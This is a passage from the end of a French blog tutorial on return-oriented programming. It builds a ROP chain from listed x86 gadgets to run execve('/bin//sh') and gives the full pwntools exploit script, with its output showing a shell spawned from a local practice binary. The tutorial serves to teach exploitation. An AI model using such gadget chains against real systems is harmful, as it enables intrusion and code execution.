<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x080de7ad : pop ecx <span class="p">;</span> ret
0x080481c9 : pop ebx <span class="p">;</span> ret
</code></pre></div></div>

<p>Bien sûr, pour pouvoir exécuter tout ça, il faut faire un appel à une instruction <code class="highlighter-rouge">int 0x80</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x0806c985 : int 0x80
</code></pre></div></div>

<p>Et bien c’est parfait, nous avons maintenant tous les gadgets en main pour pouvoir effectuer notre ROP. Pour la construction de la chaine, nous allons procéder comme suit :</p>

<ul>
  <li>Placer “/bin/sh” au début de <code class="highlighter-rouge">.data</code></li>
  <li>Placer des octets nuls juste après, pour que la chaine “/bin/sh” se termine par un caractère nul.</li>
  <li>Mettre l’adresse de “/bin/sh” dans <code class="highlighter-rouge">EBX</code></li>
  <li>Mettre des <code class="highlighter-rouge">0x00</code> dans ECX et EDX</li>
  <li>Mettre 11 (0xb) dans <code class="highlighter-rouge">EAX</code> (numéro du syscall)</li>
  <li>Faire un appel à <code class="highlighter-rouge">int 0x80</code></li>
</ul>

<p>Voici un code python qui prépare le débordement en chainant les gadgets.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span>  <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806ed1a</span><span class="p">)</span> 		<span class="c1"># pop edx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080ea000</span><span class="p">)</span> 		<span class="c1"># Dans edx, nous mettons l'adresse du début de .data
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080b8056</span><span class="p">)</span> 		<span class="c1"># pop eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'/bin'</span>				<span class="c1"># Dans eax, nous mettons la chaine de caractères "/bin"
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080546db</span><span class="p">)</span> 		<span class="c1"># mov dword ptr [edx], eax ; ret | Ce qui permet d'écrire "/bin" dans .data
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806ed1a</span><span class="p">)</span> 		<span class="c1"># pop edx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080ea004</span><span class="p">)</span> 		<span class="c1"># Dans edx, nous mettons l'adresse de .data + 4 pour prévoir "//sh"
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080b8056</span><span class="p">)</span> 		<span class="c1"># pop eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'//sh'</span>				<span class="c1"># Nous mettons "//sh" dans eax
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080546db</span><span class="p">)</span> 		<span class="c1"># mov dword ptr [edx], eax ; ret | Et nous écrivons "//sh" juste après "/bin"
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806ed1a</span><span class="p">)</span> 		<span class="c1"># pop edx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080ea008</span><span class="p">)</span> 		<span class="c1"># Dans edx, nous mettons l'adresse de .data + 8, donc après la chaine de caractères "/bin//sh"
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08049323</span><span class="p">)</span> 		<span class="c1"># xor eax, eax ; ret
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080546db</span><span class="p">)</span> 		<span class="c1"># mov dword ptr [edx], eax ; ret | Et on s'assure que cet emplacement contient des 0x00 pour terminer la chaine de caractères
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080481c9</span><span class="p">)</span> 		<span class="c1"># pop ebx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080ea000</span><span class="p">)</span> 		<span class="c1"># Dans ebx, nous mettons l'adresse du début de .data, qui contient "/bin//sh" suivi de null bytes
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080de7ad</span><span class="p">)</span> 		<span class="c1"># pop ecx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">)</span> 		<span class="c1"># On met ecx à 0
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806ed1a</span><span class="p">)</span> 		<span class="c1"># pop edx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">)</span> 		<span class="c1"># On met edx à 0
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08049323</span><span class="p">)</span> 		<span class="c1"># xor eax, eax ; ret
</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">):</span>			<span class="c1"># Afin d'avoir eax = 11, on boucle 11 fois
</span>	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0804812c</span><span class="p">)</span>	<span class="c1"># inc eax ; ret
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806c985</span><span class="p">)</span> 		<span class="c1"># int 0x80
</span></code></pre></div></div>

<p>Rappelez-vous cependant que cette suite de gadgets, appelée <strong>ropchain</strong>, est initiée lors du retour de la fonction. Donc la première instruction de cette <strong>ropchain</strong> doit écraser la sauvegarde de <code class="highlighter-rouge">EIP</code> de la fonction appelante.</p>

<p>Nous avons vu en détails dans différents articles comment trouver la taille du buffer à allouer avant d’écraser la sauvegarde de <code class="highlighter-rouge">EIP</code>, et dans mon cas c’est un buffer de 148 octets. Ainsi, mon exploit ressemble à cela en python, en utilisant <code class="highlighter-rouge">pwntools</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#coding: utf-8
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./rop"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">148</span>

<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806ed1a</span><span class="p">)</span> 	<span class="c1"># pop edx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080ea000</span><span class="p">)</span> 	<span class="c1"># Dans edx, nous mettons l'adresse du début de .data
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080b8056</span><span class="p">)</span> 	<span class="c1"># pop eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'/bin'</span>						<span class="c1"># Dans eax, nous mettons la chaine de caractères "/bin"
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080546db</span><span class="p">)</span> 	<span class="c1"># mov dword ptr [edx], eax ; ret | Ce qui permet d'écrire "/bin" dans .data
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806ed1a</span><span class="p">)</span> 	<span class="c1"># pop edx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080ea004</span><span class="p">)</span> 	<span class="c1"># Dans edx, nous mettons l'adresse de .data + 4 pour prévoir "//sh"
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080b8056</span><span class="p">)</span> 	<span class="c1"># pop eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'//sh'</span>						<span class="c1"># Nous mettons "//sh" dans eax
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080546db</span><span class="p">)</span> 	<span class="c1"># mov dword ptr [edx], eax ; ret | Et nous écrivons "//sh" juste après "/bin"
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806ed1a</span><span class="p">)</span> 	<span class="c1"># pop edx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080ea008</span><span class="p">)</span> 	<span class="c1"># Dans edx, nous mettons l'adresse de .data + 8, donc après la chaine de caractères "/bin//sh"
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08049323</span><span class="p">)</span> 	<span class="c1"># xor eax, eax ; ret
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080546db</span><span class="p">)</span> 	<span class="c1"># mov dword ptr [edx], eax ; ret | Et on s'assure que cet emplacement contient des 0x00 pour terminer la chaine de caractères
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080481c9</span><span class="p">)</span> 	<span class="c1"># pop ebx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080ea000</span><span class="p">)</span> 	<span class="c1"># Dans ebx, nous mettons l'adresse du début de .data, qui contient "/bin//sh" suivi de null bytes
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080de7ad</span><span class="p">)</span> 	<span class="c1"># pop ecx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">)</span> 	<span class="c1"># On met ecx à 0
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806ed1a</span><span class="p">)</span> 	<span class="c1"># pop edx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">)</span> 	<span class="c1"># On met edx à 0
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08049323</span><span class="p">)</span> 	<span class="c1"># xor eax, eax ; ret
</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">):</span>				<span class="c1"># Afin d'avoir eax = 11, on boucle 11 fois
</span>	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0804812c</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806c985</span><span class="p">)</span> 	<span class="c1"># int 0x80
</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Ainsi, lorsque nous lançons notre exploit, nous récupérons bien un shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python exploit.py 
<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./rop'</span>: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
You password is incorrect
<span class="nv">$ </span>
</code></pre></div></div>

<p>ROP, c’est super chouette, amusez vous avec ça. Dans mon exemple, je n’avais malheureusement pas de gadget de la form</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int 0x80
ret
</code></pre></div></div>

<p>Donc je ne pouvais pas enchaîner les appels systèmes. Mais si vous avez ça dans un autre binaire, alors vous pouvez enchaîner presque autant d’appels systèmes que vous le souhaitez, et vous pouvez ainsi construire une chaine d’exécution complexe, seulement en utilisant des bouts de codes à droite et à gauche.</p>

<p>Par ailleurs, si vous êtes intéressés pour aller un peu plus loin, je vous conseille vivement la lecture de l’excellent article de Geluchat <a href="https://www.dailysecurity.fr/return_oriented_programming/" target="blank">Petit Manuel du ROP à l’usage des débutants</a>.</p>

<p>Have fun !</p>

  </article>
</div>
<div class="keywords">
    <span class="post-tags"><a href="/archives/#user-land"><i class="fas fa-tags"></i> User Land</a><a href="/archives/#linux"><i class="fas fa-tags"></i> Linux</a></span>
  </div>


<br />
<div class="box">
  <div class="dash">
    <div class="picture">
      <img src="/assets/icones/pixis_logo.png" alt="logo" title="logo" />
    </div>
    <div class="box_content">
      <strong>Auteur</strong> : <a href="/contact/" target="_blank">Pixis</a><br />
      Créateur du blog, suivez-moi sur <a href="https://twitter.com/HackAndDo/" target="_blank">twitter</a> ou <a href="https://discord.gg/9At6SUZ" target="blank">discord</a>
    </div>
    
  </div>
</div>


<div class="related">
  <h2>Articles similaires</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/pass-the-hash/">
            Pass the Hash
            <small>18 Dec 2019</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/remote-lsass-dump-passwords/">
            Extraction des secrets de lsass à distance
            <small>28 Nov 2019</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/bloodhound/">
            BloodHound
            <small>30 Jul 2019</small>
          </a>
        </h3>
      </li>
    
  </ul>
</div>

<div id="disqus_thread"></div>
<script>
    /**
     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */
    
    var disqus_config = function () {
        this.page.url = 'http://localhost:4000/return-oriented-programming/';  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = '0000-0000-0000-0016';
    };
    
    (function() {  // DON'T EDIT BELOW THIS LINE
        var d = document, s = d.createElement('script');
        
        s.src = '//hackndo.disqus.com/embed.js';
        
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

        </div>
    </main>
    <script src="/assets/js/jquery-2.1.4.js"></script>
    <script src="/assets/js/jquery.menu-aim.js"></script>
    <script src="/assets/js/anchor.min.js"></script>
    <script src="/assets/js/main.js"></script> <!-- Resource jQuery -->
  </body>
</html>